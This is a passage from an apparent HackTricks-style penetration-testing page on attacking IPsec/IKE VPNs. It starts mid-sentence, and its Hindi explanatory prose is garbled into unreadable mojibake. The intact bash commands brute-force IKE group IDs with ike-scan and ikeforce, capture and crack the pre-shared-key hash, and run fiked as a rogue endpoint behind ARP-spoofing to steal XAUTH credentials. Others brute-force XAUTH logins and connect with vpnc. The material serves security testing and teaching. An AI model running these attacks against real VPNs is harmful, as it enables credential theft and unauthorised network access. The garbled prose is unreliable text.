рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ):

![](<../.gitbook/assets/image (917).png>)

рд▓реЗрдХрд┐рди рдпрджрд┐ рдЬреИрд╕рд╛ рдХрд┐ рдореИрдВрдиреЗ рдХрд╣рд╛, рдХреЛрдИ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╕рдВрднрд╛рд╡рд┐рдд рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧреА** рдФрд░ рдЙрди рдЖрдИрдбреА рдХреЛ рд╡рд╛рдкрд╕ рдХрд░реЗрдЧреА рдЬрд╣рд╛рдБ рдПрдХ рдорд╛рдиреНрдп рд╣реИрдВрдбрд╢реЗрдХ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдпрд╣ рдПрдХ рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдо рд╣реЛрдЧрд╛)ред

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ ike-scan рдХрдорд╛рдВрдб рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред рдФрд░ рдпрджрд┐ рдЖрдкрдиреЗ рдХрдИ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рд╣реИ, рддреЛ рдЙрдиреНрд╣реЗрдВ рд╕рднреА рдХреЛ рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рд▓реВрдк рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдВрдХреЛрдЪ рди рдХрд░реЗрдВ (рдЖрдкрдХреЛ рддрдм рддрдХ рд╕рднреА рдХреЛ рдЖрдЬрдорд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдХрд┐ рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рди рдХрд░реЗ)ред

рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [ikeforce рдХрд╛ рд╢рдмреНрджрдХреЛрд╢](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) рдпрд╛ [seclists рдореЗрдВ рдПрдХ](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Iker рдХреЗ рд╕рд╛рде ID рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) рднреА **ike-scan** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ **ike-scan** рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ **рдПрдХ рдорд╛рдиреНрдп ID рдЦреЛрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╡рд┐рдзрд┐ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред

### ikeforce рдХреЗ рд╕рд╛рде ID рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **ID рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг **рд╡рд┐рднрд┐рдиреНрди рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛** рдЬреЛ **рдПрдХ рдорд╛рдиреНрдп рдФрд░ рдЧреИрд░-рдорд╛рдиреНрдп ID рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ (рдЗрд╕рдореЗрдВ рдЭреВрдареЗ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдФрд░ рдЭреВрдареЗ рдирдХрд╛рд░рд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдореИрдВ рд╕рдВрднрд╡рддрдГ ike-scan рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдкрд╕рдВрдж рдХрд░рддрд╛ рд╣реВрдВ)ред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **ikeforce** рд╢реБрд░реБрдЖрдд рдореЗрдВ рдХреБрдЫ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ IDs рднреЗрдЬреЗрдЧрд╛ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдгрдиреАрддрд┐ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреА рдЬрд╛ рд╕рдХреЗред

* **рдкрд╣рд▓реА рд╡рд┐рдзрд┐** рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреЛ **рдЦреЛрдЬрдиреЗ** рдХреЗ рджреНрд╡рд╛рд░рд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реИ **Dead Peer Detection DPD** рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП Cisco рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреА (рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдХреЗрд╡рд▓ рддрдм рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреБрдирдГ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ рдЬрдм рд╕рдореВрд╣ рдирд╛рдо рд╕рд╣реА рд╣реЛрддрд╛ рд╣реИ)ред
* рдЙрдкрд▓рдмреНрдз **рджреВрд╕рд░реА рд╡рд┐рдзрд┐** рдпрд╣ рд╣реИ рдХрд┐ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдпрд╛рд╕ рдХреЗ рд▓рд┐рдП рднреЗрдЬреЗ рдЧрдП рдЙрддреНрддрд░реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдХреНрдпреЛрдВрдХрд┐ рдХрднреА-рдХрднреА рд╕рд╣реА ID рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЕрдзрд┐рдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
* **рддреАрд╕рд░реА рд╡рд┐рдзрд┐** **рдЧрд▓рдд ID рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ "INVALID-ID-INFORMATION" рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ** рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред
* рдЕрдВрдд рдореЗрдВ, рдпрджрд┐ рд╕рд░реНрд╡рд░ рдЬрд╛рдВрдЪреЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рднреА рдкреБрдирдГ рдирд╣реАрдВ рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ **ikeforce** рд╕рд░реНрд╡рд░ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдФрд░ рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ рдЬрдм рд╕рд╣реА ID рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ рддреЛ рд╕рд░реНрд╡рд░ рдХреБрдЫ рдкреИрдХреЗрдЯ рдХреЗ рд╕рд╛рде рдкреБрдирдГ рднреЗрдЬрддрд╛ рд╣реИред\
рд╕реНрдкрд╖реНрдЯ рд╣реИ, ID рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп **PSK** рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдорд╛рдиреНрдп ID рд╣реЛред рдлрд┐рд░, **ID** рдФрд░ **PSK** рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ XAUTH рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдпрджрд┐ рдпрд╣ рд╕рдХреНрд╖рдо рд╣реИ)ред

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ ikeforce рдХрдорд╛рдВрдб рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред рдФрд░ рдпрджрд┐ рдЖрдкрдиреЗ рдХрдИ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рд╣реИ рддреЛ рдЙрдиреНрд╣реЗрдВ рд╕рднреА рдХреЛ рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рд▓реВрдк рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдВрдХреЛрдЪ рди рдХрд░реЗрдВ (рдЖрдкрдХреЛ рддрдм рддрдХ рд╕рднреА рдХреЛ рдЖрдЬрдорд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рди рдХрд░реЗ)ред
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ VPN рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдХреЗ рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ, рдХреНрдпреЛрдВрдХрд┐ рдкрд╣рд▓реЗ рдЖрдХреНрд░рд╛рдордХ рдореЛрдб рдкреИрдХреЗрдЯ рдЬрд┐рд╕рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ ID рд╣реЛрддреА рд╣реИ, рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

рдЕрдВрдд рдореЗрдВ, рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди** рдФрд░ **рд╕рдореВрд╣ рдирд╛рдо** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **рдЖрдХреНрд░рд╛рдордХ рдореЛрдб рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ**, рддреЛ рдЖрдк рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
рд╣реИрд╢ _hash.txt_ рдХреЗ рдЕрдВрджрд░ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк **psk-crack**, **john** ( [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП) рдФрд░ **hashcat** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ **crack** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**рдЖрдХреНрд░рд╛рдордХ рдореЛрдб IKE** рдХреЛ **рдкреВрд░реНрд╡-рд╢реЗрдпрд░ рдХреА (PSK)** рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ **рд╕рдореВрд╣ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ **XAuth (рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг)** рджреНрд╡рд╛рд░рд╛ рдмрдврд╝рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреА рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдкрд░рдд рдкреЗрд╢ рдХрд░рддрд╛ рд╣реИред рдРрд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд╛рдорд╛рдиреНрдпрддрдГ **Microsoft Active Directory**, **RADIUS**, рдпрд╛ рддреБрд▓рдиреАрдп рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдЬреИрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

**IKEv2** рдореЗрдВ рд╕рдВрдХреНрд░рдордг рдХрд░рддреЗ рд╕рдордп, рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрджрд▓рд╛рд╡ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ **EAP (рд╡рд┐рд╕реНрддрд╛рд░ рдпреЛрдЧреНрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдХрд╛ рдЙрдкрдпреЛрдЧ **XAuth** рдХреЗ рд╕реНрдерд╛рди рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрди рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрдЪрд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рднреАрддрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдерд╛рдУрдВ рдореЗрдВ рдПрдХ рд╡рд┐рдХрд╛рд╕ рдХреЛ рд░реЗрдЦрд╛рдВрдХрд┐рдд рдХрд░рддрд╛ рд╣реИред

### рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ MitM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рддреЛ рдЖрдк _fiked_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд╛ рдбреЗрдЯрд╛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╣реИ (рдЖрдкрдХреЛ sniffing рдХреЗ рд▓рд┐рдП IKE рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ `fiked` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ ARP spoofing рдХреА рдорджрдж рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, [рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked рдПрдХ VPN рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░реЗрдЧрд╛ рдФрд░ XAuth рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Also, using IPSec try to make a MitM attack and block all traffic to port 500, if the IPSec tunnel cannot be established maybe the traffic will be sent in clear.

### Brute-forcing XAUTH username рдФрд░ password with ikeforce

To brute force the **XAUTH** (when you know a valid group name **id** and the **psk**) you can use a username or list of usernames and a list o passwords:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
рдЗрд╕ рддрд░рд╣, ikeforce рдкреНрд░рддреНрдпреЗрдХ username:password рдХреЗ рд╕рдВрдпреЛрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдиреНрдп рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдо рдкрд╛рдП рд╣реИрдВ, рддреЛ рдмрд╕ рдЙрдиреНрд╣реЗрдВ рдкрд┐рдЫрд▓реЗ рдЪрд░рдгреЛрдВ рдХреА рддрд░рд╣ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

## IPSEC VPN рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг

Kali рдореЗрдВ, **VPNC** IPsec рдЯрдирд▓ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **рдкреНрд░реЛрдлрд╛рдЗрд▓** рдХреЛ `/etc/vpnc/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдк _**vpnc**_ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди рдкреНрд░реЛрдлрд╛рдЗрд▓ рдХреЛ рдЖрд░рдВрдн рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди VPNC рдХреЗ рд╕рд╛рде VPN рдХрдиреЗрдХреНрд╢рди рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВ:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
In this setup:

* `[VPN_GATEWAY_IP]` рдХреЛ VPN рдЧреЗрдЯрд╡реЗ рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ IP рдкрддреЗ рд╕реЗ рдмрджрд▓реЗрдВред
* `[VPN_CONNECTION_ID]` рдХреЛ VPN рдХрдиреЗрдХреНрд╢рди рдХреЗ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╕реЗ рдмрджрд▓реЗрдВред
* `[VPN_GROUP_SECRET]` рдХреЛ VPN рдХреЗ рд╕рдореВрд╣ рдЧреБрдкреНрдд рд╕реЗ рдмрджрд▓реЗрдВред
* `[VPN_USERNAME]` рдФрд░ `[VPN_PASSWORD]` рдХреЛ VPN рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реЗ рдмрджрд▓реЗрдВред
* `[PID]` рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ ID рдХрд╛ рдкреНрд░рддреАрдХ рд╣реИ рдЬреЛ `vpnc` рдкреНрд░рд╛рд░рдВрдн рдХрд░рддреЗ рд╕рдордп рдЕрд╕рд╛рдЗрди рдХреА рдЬрд╛рдПрдЧреАред

VPN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╕рдордп рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡рд┐рдХ, рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВред

## Reference Material

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
